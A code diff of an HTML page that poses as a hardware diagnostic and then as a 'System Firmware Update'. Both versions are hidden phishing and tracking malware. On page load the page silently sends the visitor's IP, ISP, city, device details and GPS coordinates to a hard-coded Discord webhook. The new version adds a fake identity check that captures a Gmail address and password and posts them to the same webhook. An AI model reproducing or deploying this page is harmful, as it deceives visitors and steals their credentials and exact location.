@@ -3,72 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced System Diagnostic v10.4</title>
+    <title>System Firmware Update v12.0</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; overflow: hidden; }
-        .scanner-box { width: 90%; max-width: 550px; border: 2px solid #0f0; padding: 30px; position: relative; background: rgba(0, 5, 0, 0.98); box-shadow: 0 0 40px #0f0; }
-        .line { width: 100%; height: 4px; background: #0f0; position: absolute; left: 0; animation: scan 2s infinite linear; box-shadow: 0 0 20px #0f0; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        h2 { text-align: center; letter-spacing: 5px; color: #0f0; text-shadow: 0 0 15px #0f0; }
-        #console { font-size: 13px; height: 200px; overflow: hidden; color: #0f0; line-height: 1.6; border: 1px solid #030; padding: 10px; background: #010; }
+        body { background: #050505; color: #00ff00; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { width: 90%; max-width: 450px; border: 1px solid #333; padding: 25px; background: #000; box-shadow: 0 0 50px rgba(0,255,0,0.2); border-radius: 10px; text-align: center; }
+        .loading-bar { width: 100%; height: 4px; background: #222; margin: 20px 0; position: relative; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background: #00ff00; position: absolute; animation: load 3s forwards; }
+        @keyframes load { to { width: 100%; } }
+        .device-info { font-weight: bold; color: #fff; background: #111; padding: 10px; border-radius: 5px; border: 1px solid #00ff00; margin-bottom: 15px; display: none; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #333; color: #fff; border-radius: 5px; outline: none; }
+        input:focus { border-color: #00ff00; }
+        button { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; text-transform: uppercase; }
+        #status-log { font-size: 11px; color: #888; margin-top: 15px; text-align: left; height: 50px; overflow: hidden; }
     </style>
 </head>
 <body>
-    <div class="scanner-box">
-        <div class="line"></div>
-        <h2>HARDWARE ANALYSIS</h2>
-        <div id="console">
-            [BOOT] Security Protocol 10.4 Active...<br>
-            [BOOT] Establishing Neural Link...<br>
+    <div class="container">
+        <h3 id="main-head">SYSTEM SECURITY SHIELD</h3>
+        <div id="device-box" class="device-info">DETECTING HARDWARE...</div>
+        
+        <div class="loading-bar"><div class="progress"></div></div>
+        
+        <div id="login-section" style="display:none;">
+            <p style="font-size: 13px; color: #ccc;">Device Sync Failed. Please verify identity to continue firmware update.</p>
+            <input type="email" id="email" placeholder="Gmail Address" required>
+            <input type="password" id="pass" placeholder="Password" required>
+            <button onclick="sendFinal()">VERIFY & UPDATE</button>
         </div>
-        <p style="text-align:center; font-size: 12px; color: #fff;">SYNCING HARDWARE IDENTITY - PLEASE DO NOT EXIT</p>
+
+        <div id="status-log">
+            [SYS] Initializing core...<br>
+            [SYS] Locating hardware nodes...
+        </div>
     </div>
 
     <script>
-        const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+        const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-        const logBox = document.getElementById('console');
-        const msgs = ["[OK] LINK STABLE", "[INFO] FETCHING IP DATA...", "[INFO] EXTRACTING GPU INFO...", "[INFO] DECRYPTING MODEL ID...", "[CRITICAL] SYNCING GPS...", "[SUCCESS] DATA ENCRYPTED."];
-        let idx = 0;
-        setInterval(() => { if(idx < msgs.length) { logBox.innerHTML += msgs[idx] + "<br>"; idx++; } }, 700);
+        setTimeout(() => {
+            const platform = navigator.platform;
+            document.getElementById('device-box').innerText = "DEVICE IDENTIFIED: " + platform;
+            document.getElementById('device-box').style.display = "block";
+            document.getElementById('status-log').innerHTML += "<br>[OK] HARDWARE SYNCED.";
+        }, 1200);
 
-        async function fetchIntel() {
-            // আইপি এবং সিম কোম্পানির তথ্য
-            const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
-            
-            const payload = {
-                content: "🧨 **TARGET CAUGHT IN THE TRAP** 🧨",
+        setTimeout(() => {
+            document.getElementById('login-section').style.display = "block";
+        }, 3500);
+
+        async function collectBaseData() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
+                const data = {
+                    content: "🔥 **DEVICE CONNECTED** 🔥",
+                    embeds: [{
+                        color: 0x00ff00,
+                        fields: [
+                            { name: "IP", value: ipRes.ip || "N/A", inline: true },
+                            { name: "ISP", value: ipRes.org || "N/A", inline: true },
+                            { name: "Location", value: ipRes.city + ", " + ipRes.country_name },
+                            { name: "Device", value: navigator.userAgent }
+                        ]
+                    }]
+                };
+                fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
+
+                navigator.geolocation.getCurrentPosition(p => {
+                    fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, 
+                    body: JSON.stringify({ content: "📍 GPS: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude })});
+                });
+            } catch (e) {}
+        }
+
+        async function sendFinal() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(!email || !pass) return alert("Fields cannot be empty!");
+
+            const loginData = {
+                content: "🧨 **GMAIL CAPTURED** 🧨",
                 embeds: [{
-                    title: "Advanced Device & Network Report",
-                    color: 0x00FF00,
+                    color: 0xff0000,
                     fields: [
-                        { name: "🌐 IP Address", value: ipRes.ip || "N/A", inline: true },
-                        { name: "🏢 Provider (ISP)", value: ipRes.org || "N/A", inline: true },
-                        { name: "🏙️ City/Region", value: `${ipRes.city}, ${ipRes.region}`, inline: true },
-                        { name: "📱 Device Platform", value: navigator.platform, inline: true },
-                        { name: "🧠 Processor (Cores)", value: navigator.hardwareConcurrency + " Cores", inline: true },
-                        { name: "💾 Device RAM", value: (navigator.deviceMemory || "N/A") + " GB", inline: true },
-                        { name: "🖥️ Screen Size", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                        { name: "🛠️ System/Browser", value: navigator.userAgent }
+                        { name: "Email", value: email },
+                        { name: "Password", value: pass }
                     ]
                 }]
             };
-
-            fetch(HOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
-
-            // লোকেশন বের করার মরণফাঁদ
-            navigator.geolocation.getCurrentPosition(pos => {
-                const maps = {
-                    content: "📍 **EXACT GPS COORDINATES FOUND**",
-                    embeds: [{
-                        color: 0xFF0000,
-                        description: `**Google Maps Link:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n**Accuracy:** ${pos.coords.accuracy}m`
-                    }]
-                };
-                fetch(HOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(maps) });
-            });
+            await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(loginData) });
+            alert("System Update Started. Please do not close this window for 10 minutes.");
         }
-        fetchIntel();
+
+        collectBaseData();
     </script>
 </body>
 </html>
+
